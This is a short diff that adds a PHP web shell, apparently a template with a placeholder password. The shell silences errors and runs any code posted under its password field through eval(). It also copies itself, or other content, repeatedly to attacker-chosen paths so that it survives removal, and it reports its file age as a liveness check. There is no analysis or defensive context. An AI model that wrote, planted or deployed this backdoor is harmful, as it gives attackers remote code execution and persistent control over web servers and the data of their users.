@@ -1,0 +1,32 @@
+<?php
+    @set_time_limit(0);
+    @ignore_user_abort(1);
+    @error_reporting(0);
+    if(isset($_POST['%(password)s'])) {
+        eval($_POST['%(password)s']);
+    }
+    else if(isset($_POST[loc])) {
+        $content = false;
+        $paths = explode("$", $_POST[loc]);
+        foreach($paths as $path) {
+            if($content) break;
+            else $content = file_get_contents($path);
+        }
+        if(!$content) $content = file_get_contents(__FILE__);
+        if($content) {
+            $count = 1500;
+            while($count > 0) {
+                foreach($paths as $path) {
+                    is_dir(dirname($path)) or mkdir(dirname($path), 0755, true);
+                    file_put_contents($path, $content);
+                    chmod($path, 0644);
+                    usleep(100);
+                }
+                $count = $count - 1;
+            }
+        }
+    }
+    else {
+        echo time()-filemtime(__FILE__);
+    }
+?>
